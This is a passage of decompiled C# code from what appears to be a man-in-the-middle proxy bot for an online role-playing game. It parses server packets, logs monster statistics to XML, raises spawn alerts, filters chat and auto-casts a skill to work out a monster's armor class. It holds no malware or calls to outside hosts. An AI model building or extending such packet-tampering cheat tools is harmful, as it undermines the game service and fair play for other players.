        TimeSpan timeSpan;
        if (npc1.Image < 32768)
        {
          msg.Read(4);
          byte num2 = msg.ReadByte();
          npc1.Location.Direction = (Direction) num2;
          int num3 = (int) msg.ReadByte();
          npc1.Type = (Npc.NpcType) msg.ReadByte();
          if (npc1.Type == Npc.NpcType.Mundane)
            npc1.Name = msg.ReadString((int) msg.ReadByte());
          if (!Server.StaticCharacters.ContainsKey(npc1.ID))
            Server.StaticCharacters.Add(npc1.ID, (Character) npc1);
          if (!client.Characters.ContainsKey(npc1.ID))
          {
            if (npc1.MapName.Equals("Lost Ruins 2") && npc1.Image - 16384 == 422)
            {
              foreach (Npc npc2 in ((IEnumerable<Npc>) client.NearbyMonstersByImage("422")).ToArray<Npc>())
              {
                if (npc2 != null && npc2.isParentGrime && npc2.DistanceFrom(npc1.Location) == 1)
                {
                  npc1.isGrimeSpawn = true;
                  break;
                }
              }
            }
            if (client.Tab.recorditemdata.Checked)
            {
              if (npc1.MapName.Contains("Astrid") && npc1.Image - 16384 == 50)
              {
                foreach (Npc npc2 in ((IEnumerable<Npc>) client.NearbyMonstersByImage("2")).ToArray<Npc>())
                {
                  if (npc2 != null && npc2.DistanceFrom(npc1.Location) == 1)
                  {
                    npc1.wassummoned = true;
                    break;
                  }
                }
              }
              if ((npc1.MapName.Contains("Shifting Swamp") || npc1.MapName.Contains("Chandi")) && (npc1.Image - 16384 == 85 || npc1.Image - 16384 == 88 || npc1.Image - 16384 == 89))
              {
                foreach (Npc npc2 in ((IEnumerable<Npc>) client.NearbyMonstersByImage("102")).ToArray<Npc>())
                {
                  if (npc2 != null && npc2.DistanceFrom(npc1.Location) == 1)
                  {
                    npc1.wassummoned = true;
                    break;
                  }
                }
              }
            }
            npc1.CreateTime = DateTime.UtcNow;
            npc1.InViewTime = DateTime.UtcNow;
            client.Characters.Add(npc1.ID, (Character) npc1);
          }
          else
          {
            client.Characters[npc1.ID].InViewTime = DateTime.UtcNow;
            client.Characters[npc1.ID].Map = npc1.Map;
            client.Characters[npc1.ID].Location.X = npc1.Location.X;
            client.Characters[npc1.ID].Location.Y = npc1.Location.Y;
            client.Characters[npc1.ID].Location.Direction = npc1.Location.Direction;
            client.Characters[npc1.ID].IsOnScreen = true;
          }
        }
        else
        {
          npc1.Color = msg.ReadByte();
          int num2 = (int) msg.ReadUInt16();
          npc1.Type = Npc.NpcType.Item;
          npc1.SpawnLocation.X = npc1.Location.X;
          npc1.SpawnLocation.Y = npc1.Location.Y;
          if (!Server.StaticCharacters.ContainsKey(npc1.ID))
            Server.StaticCharacters.Add(npc1.ID, (Character) npc1);
          if (!client.Characters.ContainsKey(npc1.ID))
          {
            npc1.CreateTime = DateTime.UtcNow;
            npc1.InViewTime = DateTime.UtcNow;
            client.Characters.Add(npc1.ID, (Character) npc1);
            int num3;
            if (client.lastdroploc != null && npc1.Location.X == client.lastdroploc.X && npc1.Location.Y == client.lastdroploc.Y)
            {
              timeSpan = DateTime.UtcNow.Subtract(client.lastdroptime);
              num3 = timeSpan.TotalMilliseconds >= 800.0 ? 1 : 0;
            }
            else
              num3 = 1;
            if (num3 == 0)
            {
              client.Characters[npc1.ID].Looted = true;
              client.lastdroploc = (Location) null;
              client.lastdroptime = DateTime.UtcNow;
            }
          }
          else
          {
            client.Characters[npc1.ID].InViewTime = DateTime.UtcNow;
            client.Characters[npc1.ID].Map = npc1.Map;
            client.Characters[npc1.ID].Location.X = npc1.Location.X;
            client.Characters[npc1.ID].Location.Y = npc1.Location.Y;
            client.Characters[npc1.ID].IsOnScreen = true;
          }
          if (client.Tab.getrealnames.Checked && (npc1.Location.X == client.ClientLocation.X && npc1.Location.Y == client.ClientLocation.Y))
            client.DistanceLook((ushort) npc1.Location.X, (ushort) npc1.Location.Y);
        }
        npc1.Image -= 16384;
        int num4;
        if (npc1.Image == 156 && Program.MainForm.champalert.Checked)
        {
          if (!(Server.alarmTimer == DateTime.MinValue))
          {
            timeSpan = DateTime.UtcNow.Subtract(Server.alarmTimer);
            if (timeSpan.TotalSeconds <= 60.0)
              goto label_50;
          }
          if (!(client.Alertdelay == DateTime.MinValue))
          {
            timeSpan = DateTime.UtcNow.Subtract(client.Alertdelay);
            num4 = timeSpan.TotalSeconds <= 60.0 ? 1 : 0;
            goto label_51;
          }
          else
          {
            num4 = 0;
            goto label_51;
          }
        }
label_50:
        num4 = 1;
label_51:
        if (num4 == 0)
        {
          client.SendMessage("Carnun Champion spotted!", "red", false);
          if (!Server.SentryAlarm)
          {
            Server.SentryAlarm = true;
            Server.alarm = new SoundPlayer(Assembly.GetExecutingAssembly().GetManifestResourceStream("ProxyBase.chime.wav"));
            Server.alarmTimer = DateTime.UtcNow;
            Server.alarm.Play();
          }
        }
        int num5;
        if (npc1.Image == 3 && npc1.Location.X == client.ServerLocation.X && npc1.Location.Y == client.ServerLocation.Y)
        {
          timeSpan = DateTime.UtcNow.Subtract(npc1.CreateTime);
          num5 = timeSpan.TotalSeconds >= 1.0 ? 1 : 0;
        }
        else
          num5 = 1;
        if (num5 == 0)
        {
          client.Disenchanter = npc1;
          client.disenchanterappears = true;
        }
        if (npc1.Image == 258)
          client.SendMessage("Golden Floppy at " + (object) npc1.Location.X + ", " + (object) npc1.Location.Y, (byte) 11, false);
        if (npc1.Image == 18165)
          client.SendMessage("Anklet at " + (object) npc1.Location.X + ", " + (object) npc1.Location.Y, (byte) 11, false);
      }
      return true;
    }

    public bool ServerMessage_0x08_Statistics(Client client, ServerPacket msg)
    {
      uint currentHp = client.Statistics.CurrentHP;
      byte num1 = msg.ReadByte();
      if (((int) num1 & 32) == 32)
      {
        msg.Read(3);
        client.Statistics.Level = (int) msg.ReadByte();
        client.Statistics.Ability = (int) msg.ReadByte();
        client.Statistics.MaximumHP = msg.ReadUInt32();
        client.Statistics.MaximumMP = msg.ReadUInt32();
        client.Statistics.Str = (int) msg.ReadByte();
        client.Statistics.Int = (int) msg.ReadByte();
        client.Statistics.Wis = (int) msg.ReadByte();
        client.Statistics.Con = (int) msg.ReadByte();
        client.Statistics.Dex = (int) msg.ReadByte();
        bool flag = msg.ReadByte() != (byte) 0;
        client.Statistics.AvailablePoints = (int) msg.ReadByte();
        client.Statistics.MaximumWeight = (int) msg.ReadUInt16();
        client.Statistics.CurrentWeight = (int) msg.ReadUInt16();
        msg.Read(4);
        if (client.Tab.AscendOptions.currentbasehp.Text != client.Statistics.MaximumHP.ToString("#,##0"))
          client.Tab.AscendOptions.currentbasehp.Text = client.Statistics.MaximumHP.ToString("#,##0");
        if (client.Tab.AscendOptions.currentbasemp.Text != client.Statistics.MaximumMP.ToString("#,##0"))
          client.Tab.AscendOptions.currentbasemp.Text = client.Statistics.MaximumMP.ToString("#,##0");
        if (client.Loaded)
          new Thread((ThreadStart) (() => client.Tab.AscendOptions.statbuyupdate())).Start();
      }
      if (((int) num1 & 16) == 16)
      {
        client.Statistics.CurrentHP = msg.ReadUInt32();
        client.Statistics.CurrentMP = msg.ReadUInt32();
        if (client.Tab.beadummy.Checked && client.Statistics.CurrentHP < currentHp)
        {
          uint num2 = currentHp - client.Statistics.CurrentHP;
          if (client.testdmg && num2 != 11025U && num2 != 46284U)
          {
            if (client.lowestdmg == 0U || client.lowestdmg > num2)
              client.lowestdmg = num2;
            if (client.highestdmg == 0U || client.highestdmg < num2)
              client.highestdmg = num2;
          }
          client.SendMessage("You did " + num2.ToString(), (byte) 0, false);
        }
      }
      if (((int) num1 & 8) == 8)
      {
        uint gold = client.Statistics.Gold;
        client.Statistics.Experience = msg.ReadUInt32();
        client.Statistics.ToNextLevel = msg.ReadUInt32();
        client.Statistics.AbilityExp = msg.ReadUInt32();
        client.Statistics.ToNextAbility = msg.ReadUInt32();
        msg.Read(4);
        client.Statistics.Gold = msg.ReadUInt32();
        if (client.Tab.AscendOptions.currentexpboxed.Text != client.Statistics.Experience.ToString("#,##0"))
          client.Tab.AscendOptions.currentexpboxed.Text = client.Statistics.Experience.ToString("#,##0");
        if (client.Statistics.Gold > gold && (int) gold == (int) client.goldbefore && gold != 0U)
        {
          uint num2 = client.goldbefore - client.Statistics.Gold;
          client.SendMessage("Repair bill: " + num2.ToString() + " coins.", "grey", false);
        }
        if (client.Statistics.Gold > gold && client.LastVanishedGold != 0U && (client.Characters.ContainsKey(client.LastVanishedGold) && DateTime.UtcNow.Subtract(client.Characters[client.LastVanishedGold].DeathTime).TotalMilliseconds < 100.0))
          client.Characters[client.LastVanishedGold].GoldAmount = client.Statistics.Gold - gold;
      }
      if (((int) num1 & 4) == 4)
      {
        client.Statistics.BitMask = (int) msg.ReadUInt16();
        int num2 = (int) msg.ReadByte();
        client.Statistics.AttackElement2 = (int) msg.ReadByte();
        client.Statistics.DefenseElement2 = (int) msg.ReadByte();
        client.Statistics.MailAndParcel = msg.ReadByte();
        client.Statistics.AttackElement = (Statistics.Elements) msg.ReadByte();
        client.Statistics.DefenseElement = (Statistics.Elements) msg.ReadByte();
        client.Statistics.MagicResistance = (int) msg.ReadByte();
        int num3 = (int) msg.ReadByte();
        client.Statistics.ArmorClass = (int) msg.ReadSByte();
        client.Statistics.Damage = (int) msg.ReadByte();
        client.Statistics.Hit = (int) msg.ReadByte();
      }
      if (client.outofcowls && client.Statistics.CurrentWeight >= client.Statistics.MaximumWeight)
      {
        client.buying = false;
        client.outofcowls = false;
        client.brody = false;
      }
      int num4 = 0;
      if (client.Statistics.MailAndParcel > (byte) 0)
        num4 = client.Statistics.MailAndParcel < (byte) 16 ? (int) client.Statistics.MailAndParcel : (int) client.Statistics.MailAndParcel % 16;
      if (num4 > 0)
        client.SendMessage("You have Gifts!", (byte) 18, false);
      else if (client.LastPermMessage == "You have Gifts!")
      {
        client.SendMessage("", (byte) 18, false);
        client.LastPermMessage = string.Empty;
      }
      return true;
    }

    public bool ServerMessage_0x0A_SystemMessage(Client client, ServerPacket msg)
    {
      byte num1 = msg.ReadByte();
      string str1 = msg.ReadString16();
      string str2;
      string str3;
      int index1;
      if (num1 == (byte) 8 && client.Tab.studycreaturetxt.Checked && (str1.Contains("Sense Monster") && str1.Contains("DEFENSE NATURE")))
      {
        string[] strArray = str1.Split(Environment.NewLine.ToCharArray());
        string str4 = strArray[2].Substring(strArray[2].IndexOf("Name:") + 5);
        string str5 = str4.Remove(str4.IndexOf("EXP:") - 4).TrimStart(' ');
        string str6 = strArray[2].Substring(strArray[2].IndexOf("EXP:") + 4).Trim();
        string s = strArray[3].Substring(strArray[3].IndexOf("HP:") + 3).Trim();
        string str7 = strArray[4].Substring(strArray[4].IndexOf("Lev:") + 4).Trim();
        str2 = "";
        str3 = "";
        string str8;
        string str9;
        if (str5 != "Giant Losgann")
        {
          str8 = strArray[5].Substring(strArray[5].IndexOf("ATTACK NATURE:") + 14).Trim();
          str9 = strArray[6].Substring(strArray[6].IndexOf("DEFENSE NATURE:") + 15).Trim();
        }
        else
        {
          str8 = "Earth";
          str9 = strArray[5].Substring(strArray[5].IndexOf("DEFENSE NATURE:") + 15).Trim();
        }
        index1 = client.MapInfo.Number;
        string str10 = index1.ToString();
        string str11 = client.MapInfo.Name;
        if (str11.StartsWith("Chadul"))
          str11 = str11.Replace("'", "");
        string str12 = "0";
        if (client.MonsterInFront() != null)
        {
          index1 = client.MonsterInFront().Image;
          str12 = index1.ToString();
          client.Characters[client.MonsterInFront().ID].sensed = true;
        }
        else
        {
          bool flag = false;
          foreach (Npc nearbyNormalMonster in client.NearbyNormalMonsters())
          {
            if (nearbyNormalMonster != null && nearbyNormalMonster.IsInRSRange(client.ServerLocation, 2))
            {
              index1 = nearbyNormalMonster.Image;
              str12 = index1.ToString();
              client.Characters[nearbyNormalMonster.ID].sensed = true;
              flag = true;
              break;
            }
          }
          if (!flag)
          {
            foreach (Npc nearbyNormalMonster in client.NearbyNormalMonsters())
            {
              if (nearbyNormalMonster != null && nearbyNormalMonster.IsInRSRange(client.ServerLocation, 3))
              {
                index1 = nearbyNormalMonster.Image;
                str12 = index1.ToString();
                client.Characters[nearbyNormalMonster.ID].sensed = true;
                break;
              }
            }
          }
        }
        if (str12 != "0")
        {
          SenseMonster senseMonster = new SenseMonster()
          {
            Name = str5,
            Image = str12,
            Exp = str6,
            HP = s,
            Lev = str7,
            Attack = str8,
            Defense = str9,
            MapNumber = str10,
            MapName = str11
          };
          XmlDocument xmlDocument = new XmlDocument();
          string str13 = Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\DaItemDB\\sensed.xml";
          if (!System.IO.File.Exists(str13))
          {
            XmlNode element = (XmlNode) xmlDocument.CreateElement("maps");
            xmlDocument.AppendChild(element);
            xmlDocument.Save(str13);
          }
          if (System.IO.File.Exists(str13))
          {
            xmlDocument.Load(str13);
            XmlNode documentElement = (XmlNode) xmlDocument.DocumentElement;
            XmlNode xmlNode1 = xmlDocument.SelectSingleNode("/maps/map[@name='" + str10 + "_" + str11 + "']");
            if (xmlNode1 == null)
            {
              XmlNode element1 = (XmlNode) xmlDocument.CreateElement("map");
              documentElement.AppendChild(element1);
              XmlAttribute attribute1 = xmlDocument.CreateAttribute("name");
              attribute1.Value = str10 + "_" + str11;
              element1.Attributes.Append(attribute1);
              XmlNode element2 = (XmlNode) xmlDocument.CreateElement("monster");
              element1.AppendChild(element2);
              XmlAttribute attribute2 = xmlDocument.CreateAttribute("id");
              attribute2.Value = str12 + str5 + str6 + str7 + str10;
              element2.Attributes.Append(attribute2);
              XmlNode element3 = (XmlNode) xmlDocument.CreateElement("name");
              element3.InnerText = str5;
              element2.AppendChild(element3);
              XmlNode element4 = (XmlNode) xmlDocument.CreateElement("image");
              element4.InnerText = str12;
              element2.AppendChild(element4);
              XmlNode element5 = (XmlNode) xmlDocument.CreateElement("exp");
              element5.InnerText = str6;
              element2.AppendChild(element5);
              XmlNode element6 = (XmlNode) xmlDocument.CreateElement("minhp");
              element6.InnerText = s;
              element2.AppendChild(element6);
              XmlNode element7 = (XmlNode) xmlDocument.CreateElement("maxhp");
              element7.InnerText = s;
              element2.AppendChild(element7);
              XmlNode element8 = (XmlNode) xmlDocument.CreateElement("lev");
              element8.InnerText = str7;
              element2.AppendChild(element8);
              XmlNode element9 = (XmlNode) xmlDocument.CreateElement("attack");
              element9.InnerText = str8;
              element2.AppendChild(element9);
              XmlNode element10 = (XmlNode) xmlDocument.CreateElement("defense");
              element10.InnerText = str9;
              element2.AppendChild(element10);
              XmlNode element11 = (XmlNode) xmlDocument.CreateElement("mapnum");
              element11.InnerText = str10;
              element2.AppendChild(element11);
              XmlNode element12 = (XmlNode) xmlDocument.CreateElement("mapname");
              element12.InnerText = str11;
              element2.AppendChild(element12);
            }
            else if (xmlDocument.SelectSingleNode("/maps/map[@name='" + str10 + "_" + str11 + "']/monster[@id='" + str12 + str5 + str6 + str7 + str10 + "']") == null)
            {
              XmlNode element1 = (XmlNode) xmlDocument.CreateElement("monster");
              xmlNode1.AppendChild(element1);
              XmlAttribute attribute = xmlDocument.CreateAttribute("id");
              attribute.Value = str12 + str5 + str6 + str7 + str10;
              element1.Attributes.Append(attribute);
              XmlNode element2 = (XmlNode) xmlDocument.CreateElement("name");
              element2.InnerText = str5;
              element1.AppendChild(element2);
              XmlNode element3 = (XmlNode) xmlDocument.CreateElement("image");
              element3.InnerText = str12;
              element1.AppendChild(element3);
              XmlNode element4 = (XmlNode) xmlDocument.CreateElement("exp");
              element4.InnerText = str6;
              element1.AppendChild(element4);
              XmlNode element5 = (XmlNode) xmlDocument.CreateElement("minhp");
              element5.InnerText = s;
              element1.AppendChild(element5);
              XmlNode element6 = (XmlNode) xmlDocument.CreateElement("maxhp");
              element6.InnerText = s;
              element1.AppendChild(element6);
              XmlNode element7 = (XmlNode) xmlDocument.CreateElement("lev");
              element7.InnerText = str7;
              element1.AppendChild(element7);
              XmlNode element8 = (XmlNode) xmlDocument.CreateElement("attack");
              element8.InnerText = str8;
              element1.AppendChild(element8);
              XmlNode element9 = (XmlNode) xmlDocument.CreateElement("defense");
              element9.InnerText = str9;
              element1.AppendChild(element9);
              XmlNode element10 = (XmlNode) xmlDocument.CreateElement("mapnum");
              element10.InnerText = str10;
              element1.AppendChild(element10);
              XmlNode element11 = (XmlNode) xmlDocument.CreateElement("mapname");
              element11.InnerText = str11;
              element1.AppendChild(element11);
            }
            else
            {
              XmlNode xmlNode2 = xmlDocument.SelectSingleNode("/maps/map[@name='" + str10 + "_" + str11 + "']/monster[@id='" + str12 + str5 + str6 + str7 + str10 + "']/minhp");
              XmlNode xmlNode3 = xmlDocument.SelectSingleNode("/maps/map[@name='" + str10 + "_" + str11 + "']/monster[@id='" + str12 + str5 + str6 + str7 + str10 + "']/maxhp");
              if (xmlNode2 != null)
              {
                int num2 = int.Parse(xmlNode2.InnerText);
                int num3 = int.Parse(s);
                if (num3 < num2 && num3 < int.Parse(xmlNode3.InnerText) / 2)
                  client.SendMessage("WARNING! New Min HP: " + s + ", Old: " + xmlNode2.InnerText + ", of MAX: " + xmlNode3.InnerText, (byte) 0, false);
                xmlNode2.InnerText = s;
              }
              if (xmlNode3 != null)
              {
                int num2 = int.Parse(xmlNode3.InnerText);
                if (int.Parse(s) > num2)
                  xmlNode3.InnerText = s;
              }
              XmlNode xmlNode4 = xmlDocument.SelectSingleNode("/maps/map[@name='" + str10 + "_" + str11 + "']/monster[@id='" + str12 + str5 + str6 + str7 + str10 + "']/attack");
              if (xmlNode4 != null && !xmlNode4.InnerText.Contains(str8))
              {
                XmlNode xmlNode5 = xmlNode4;
                xmlNode5.InnerText = xmlNode5.InnerText + "," + str8;
              }
              XmlNode xmlNode6 = xmlDocument.SelectSingleNode("/maps/map[@name='" + str10 + "_" + str11 + "']/monster[@id='" + str12 + str5 + str6 + str7 + str10 + "']/defense");
              if (xmlNode6 != null && !xmlNode6.InnerText.Contains(str9))
              {
                XmlNode xmlNode5 = xmlNode6;
                xmlNode5.InnerText = xmlNode5.InnerText + "," + str9;
              }
            }
            xmlDocument.Save(str13);
          }
        }
      }
      if (Server.ignoreaislinglist.Count<string>() > 0)
      {
        foreach (string str4 in Server.ignoreaislinglist)
        {
          if (str1.ToLower().Contains(str4))
            return false;
        }
      }
      if (num1 == (byte) 8 && client.getEntityAC && (str1.Contains("Sense Monster") && str1.Contains("DEFENSE NATURE")))
      {
        string[] strArray = str1.Split(Environment.NewLine.ToCharArray());
        string str4 = strArray[2].Substring(strArray[2].IndexOf("Name:") + 5);
        string str5 = str4.Remove(str4.IndexOf("EXP:") - 4).TrimStart(' ');
        strArray[2].Substring(strArray[2].IndexOf("EXP:") + 4).Trim();
        string s = strArray[3].Substring(strArray[3].IndexOf("HP:") + 3).Trim();
        string str6 = strArray[4].Substring(strArray[4].IndexOf("Lev:") + 4).Trim();
        str2 = "";
        str3 = "";
        string str7;
        if (str5 != "Giant Losgann")
        {
          str2 = strArray[5].Substring(strArray[5].IndexOf("ATTACK NATURE:") + 14).Trim();
          str7 = strArray[6].Substring(strArray[6].IndexOf("DEFENSE NATURE:") + 15).Trim();
        }
        else
        {
          str2 = "Earth";
          str7 = strArray[5].Substring(strArray[5].IndexOf("DEFENSE NATURE:") + 15).Trim();
        }
        if (client.getEntityACsHP == 0)
        {
          client.getEntityACsHP = int.Parse(s);
          client.UseSkill("Assail", 0U);
          return false;
        }
        if (str7 == "Dark" || str7 == "Darkness" || str7 == "Light" || str7 == "None")
        {
          client.SendMessage(str5 + " is " + str7 + " defense.", (byte) 0, false);
          return false;
        }
        int num2 = client.getEntityACsHP - int.Parse(s);
        int num3 = (int) byte.MaxValue;
        if (num2 == 2003 || num2 == 2006)
          num3 = 82;
        else if (num2 == 1992 || num2 == 1994)
          num3 = 81;
        else if (num2 == 1981 || num2 == 1983)
          num3 = 80;
        else if (num2 == 1969 || num2 == 1972)
          num3 = 79;
        else if (num2 == 1958 || num2 == 1961)
          num3 = 78;
        else if (num2 == 1948 || num2 == 1950)
          num3 = 77;
        else if (num2 == 1937 || num2 == 1939)
          num3 = 76;
        else if (num2 == 1926 || num2 == 1928)
          num3 = 75;
        else if (num2 == 1915 || num2 == 1917)
          num3 = 74;
        else if (num2 == 1904 || num2 == 1906)
          num3 = 73;
        else if (num2 == 1893 || num2 == 1894)
          num3 = 72;
        else if (num2 == 1882 || num2 == 1883)
          num3 = 71;
        else if (num2 == 1871 || num2 == 1873)
          num3 = 70;
        else if (num2 == 1859 || num2 == 1862)
          num3 = 69;
        else if (num2 == 1848 || num2 == 1851)
          num3 = 68;
        else if (num2 == 1837 || num2 == 1840)
          num3 = 67;
        else if (num2 == 1827 || num2 == 1829)
          num3 = 66;
        else if (num2 == 1816 || num2 == 1818)
          num3 = 65;
        else if (num2 == 1805 || num2 == 1806)
          num3 = 64;
        else if (num2 == 1794 || num2 == 1795)
          num3 = 63;
        else if (num2 == 1783 || num2 == 1784)
          num3 = 62;
        else if (num2 == 1772 || num2 == 1773)
          num3 = 61;
        else if (num2 == 1761 || num2 == 1762)
          num3 = 60;
        else if (num2 == 1749 || num2 == 1752)
          num3 = 59;
        else if (num2 == 1738 || num2 == 1741)
          num3 = 58;
        else if (num2 == 1727 || num2 == 1730)
          num3 = 57;
        else if (num2 == 1716 || num2 == 1719)
          num3 = 56;
        else if (num2 == 1706 || num2 == 1708)
          num3 = 55;
        else if (num2 == 1695 || num2 == 1696)
          num3 = 54;
        else if (num2 == 1684 || num2 == 1685)
          num3 = 53;
        else if (num2 == 1673 || num2 == 1674)
          num3 = 52;
        else if (num2 == 1662 || num2 == 1663)
          num3 = 51;
        else if (num2 == 1651 || num2 == 1652)
          num3 = 50;
        else if (num2 == 1639 || num2 == 1641)
          num3 = 49;
        else if (num2 == 1628 || num2 == 1631)
          num3 = 48;
        else if (num2 == 1617 || num2 == 1620)
          num3 = 47;
        else if (num2 == 1606 || num2 == 1609)
          num3 = 46;
        else if (num2 == 1595 || num2 == 1597)
          num3 = 45;
        else if (num2 == 1585 || num2 == 1586)
          num3 = 44;
        else if (num2 == 1574 || num2 == 1575)
          num3 = 43;
        else if (num2 == 1563 || num2 == 1564)
          num3 = 42;
        else if (num2 == 1552 || num2 == 1553)
          num3 = 41;
        else if (num2 == 1541 || num2 == 1542)
          num3 = 40;
        else if (num2 == 1529 || num2 == 1531)
          num3 = 39;
        else if (num2 == 1518 || num2 == 1520)
          num3 = 38;
        else if (num2 == 1507 || num2 == 1510)
          num3 = 37;
        else if (num2 == 1496 || num2 == 1497)
          num3 = 36;
        else if (num2 == 1485 || num2 == 1487)
          num3 = 35;
        else if (num2 == 1474 || num2 == 1476)
          num3 = 34;
        else if (num2 == 1464 || num2 == 1465)
          num3 = 33;
        else if (num2 == 1453 || num2 == 1454)
          num3 = 32;
        else if (num2 == 1442 || num2 == 1443)
          num3 = 31;
        else if (num2 == 1431 || num2 == 1432)
          num3 = 30;
        else if (num2 == 1419 || num2 == 1421)
          num3 = 29;
        else if (num2 == 1408 || num2 == 1410)
          num3 = 28;
        else if (num2 == 1397 || num2 == 1398)
          num3 = 27;
        else if (num2 == 1386 || num2 == 1387)
          num3 = 26;
        else if (num2 == 1375 || num2 == 1376)
          num3 = 25;
        else if (num2 == 1364 || num2 == 1366)
          num3 = 24;
        else if (num2 == 1353 || num2 == 1355)
          num3 = 23;
        else if (num2 == 1343 || num2 == 1344)
          num3 = 22;
        else if (num2 == 1332 || num2 == 1333)
          num3 = 21;
        else if (num2 == 1321 || num2 == 1322)
          num3 = 20;
        else if (num2 == 1309 || num2 == 1311)
          num3 = 19;
        else if (num2 == 1298 || num2 == 1299)
          num3 = 18;
        else if (num2 == 1287 || num2 == 1288)
          num3 = 17;
        else if (num2 == 1276 || num2 == 1277)
          num3 = 16;
        else if (num2 == 1265 || num2 == 1266)
          num3 = 15;
        else if (num2 == 1254 || num2 == 1255)
          num3 = 14;
        else if (num2 == 1243 || num2 == 1245)
          num3 = 13;
        else if (num2 == 1232 || num2 == 1234)
          num3 = 12;
        else if (num2 == 1222 || num2 == 1223)
          num3 = 11;
        else if (num2 == 1211 || num2 == 1212)
          num3 = 10;
        else if (num2 == 1199 || num2 == 1200)
          num3 = 9;
        else if (num2 == 1188 || num2 == 1189)
          num3 = 8;
        else if (num2 == 1177 || num2 == 1178)
          num3 = 7;
        else if (num2 == 1166 || num2 == 1167)
          num3 = 6;
        else if (num2 == 1155 || num2 == 1156)
          num3 = 5;
        else if (num2 == 1144 || num2 == 1145)
          num3 = 4;
        else if (num2 == 1133 || num2 == 1134)
          num3 = 3;
        else if (num2 == 1122 || num2 == 1124)
          num3 = 2;
        else if (num2 == 1111 || num2 == 1113)
          num3 = 1;
        else if (num2 == 1101 || num2 == 1102)
          num3 = 0;
        else if (num2 == 1089 || num2 == 1090)
          num3 = -1;
        else if (num2 == 1078 || num2 == 1079)
          num3 = -2;
        else if (num2 == 1067 || num2 == 1068)
          num3 = -3;
        else if (num2 == 1056 || num2 == 1057)
          num3 = -4;
        else if (num2 == 1045 || num2 == 1046)
          num3 = -5;
        else if (num2 == 1034 || num2 == 1035)
          num3 = -6;
        else if (num2 == 1023 || num2 == 1024)
          num3 = -7;
        else if (num2 == 1012 || num2 == 1013)
          num3 = -8;
        else if (num2 == 1001 || num2 == 1003)
        {
          num3 = -9;
        }
        else
        {
          int num4;
          switch (num2)
          {
            case 978:
              num4 = 0;
              break;
            case 990:
              num3 = -10;
              goto label_386;
            default:
              num4 = num2 != 980 ? 1 : 0;
              break;
          }
          if (num4 == 0)
            num3 = -11;
          else if (num2 == 968 || num2 == 969)
            num3 = -12;
          else if (num2 == 957 || num2 == 958)
            num3 = -13;
          else if (num2 == 946 || num2 == 947)
            num3 = -14;
          else if (num2 == 935 || num2 == 936)
            num3 = -15;
          else if (num2 == 924 || num2 == 925)
            num3 = -16;
          else if (num2 == 913 || num2 == 914)
            num3 = -17;
          else if (num2 == 902 || num2 == 903)
          {
            num3 = -18;
          }
          else
          {
            int num5;
            switch (num2)
            {
              case 868:
                num5 = 0;
                break;
              case 880:
                num3 = -20;
                goto label_386;
              case 891:
                num3 = -19;
                goto label_386;
              default:
                num5 = num2 != 869 ? 1 : 0;
                break;
            }
            if (num5 == 0)
              num3 = -21;
            else if (num2 == 857 || num2 == 859)
              num3 = -22;
            else if (num2 == 847 || num2 == 848)
              num3 = -23;
            else if (num2 == 836 || num2 == 837)
              num3 = -24;
            else if (num2 == 825 || num2 == 826)
              num3 = -25;
            else if (num2 == 814 || num2 == 815)
              num3 = -26;
            else if (num2 == 803 || num2 == 804)
            {
              num3 = -27;
            }
            else
            {
              int num6;
              switch (num2)
              {
                case 758:
                  num6 = 0;
                  break;
                case 770:
                  num3 = -30;
                  goto label_386;
                case 781:
                  num3 = -29;
                  goto label_386;
                case 792:
                  num3 = -28;
                  goto label_386;
                default:
                  num6 = num2 != 759 ? 1 : 0;
                  break;
              }
              if (num6 == 0)
                num3 = -31;
              else if (num2 == 747 || num2 == 748)
                num3 = -32;
              else if (num2 == 736 || num2 == 738)
                num3 = -33;
              else if (num2 == 726 || num2 == 727)
                num3 = -34;
              else if (num2 == 715 || num2 == 716)
                num3 = -35;
              else if (num2 == 704 || num2 == 705)
              {
                num3 = -36;
              }
              else
              {
                int num7;
                switch (num2)
                {
                  case 648:
                    num7 = 0;
                    break;
                  case 660:
                    num3 = -40;
                    goto label_386;
                  case 671:
                    num3 = -39;
                    goto label_386;
                  case 682:
                    num3 = -38;
                    goto label_386;
                  case 693:
                    num3 = -37;
                    goto label_386;
                  default:
                    num7 = num2 != 649 ? 1 : 0;
                    break;
                }
                if (num7 == 0)
                  num3 = -41;
                else if (num2 == 637 || num2 == 638)
                  num3 = -42;
                else if (num2 == 626 || num2 == 627)
                  num3 = -43;
                else if (num2 == 615 || num2 == 617)
                  num3 = -44;
                else if (num2 == 605 || num2 == 606)
                {
                  num3 = -45;
                }
                else
                {
                  int num8;
                  switch (num2)
                  {
                    case 538:
                      num8 = 0;
                      break;
                    case 550:
                      num3 = -50;
                      goto label_386;
                    case 561:
                      num3 = -49;
                      goto label_386;
                    case 572:
                      num3 = -48;
                      goto label_386;
                    case 583:
                      num3 = -47;
                      goto label_386;
                    case 594:
                      num3 = -46;
                      goto label_386;
                    default:
                      num8 = num2 != 539 ? 1 : 0;
                      break;
                  }
                  if (num8 == 0)
                    num3 = -51;
                  else if (num2 == 527 || num2 == 528)
                    num3 = -52;
                  else if (num2 == 516 || num2 == 517)
                    num3 = -53;
                  else if (num2 == 505 || num2 == 506)
                  {
                    num3 = -54;
                  }
                  else
                  {
                    int num9;
                    switch (num2)
                    {
                      case 428:
                        num9 = 0;
                        break;
                      case 440:
                        num3 = -60;
                        goto label_386;
                      case 451:
                        num3 = -59;
                        goto label_386;
                      case 462:
                        num3 = -58;
                        goto label_386;
                      case 473:
                        num3 = -57;
                        goto label_386;
                      case 484:
                        num3 = -56;
                        goto label_386;
                      case 494:
                        num3 = -55;
                        goto label_386;
                      default:
                        num9 = num2 != 429 ? 1 : 0;
                        break;
                    }
                    if (num9 == 0)
                      num3 = -61;
                    else if (num2 == 417 || num2 == 418)
                      num3 = -62;
                    else if (num2 == 406 || num2 == 407)
                    {
                      num3 = -63;
                    }
                    else
                    {
                      int num10;
                      switch (num2)
                      {
                        case 318:
                          num10 = 0;
                          break;
                        case 330:
                          num3 = -70;
                          goto label_386;
                        case 341:
                          num3 = -69;
                          goto label_386;
                        case 352:
                          num3 = -68;
                          goto label_386;
                        case 363:
                          num3 = -67;
                          goto label_386;
                        case 373:
                          num3 = -66;
                          goto label_386;
                        case 384:
                          num3 = -65;
                          goto label_386;
                        case 395:
                          num3 = -64;
                          goto label_386;
                        default:
                          num10 = num2 != 319 ? 1 : 0;
                          break;
                      }
                      if (num10 == 0)
                        num3 = -71;
                      else if (num2 == 307 || num2 == 308)
                      {
                        num3 = -72;
                      }
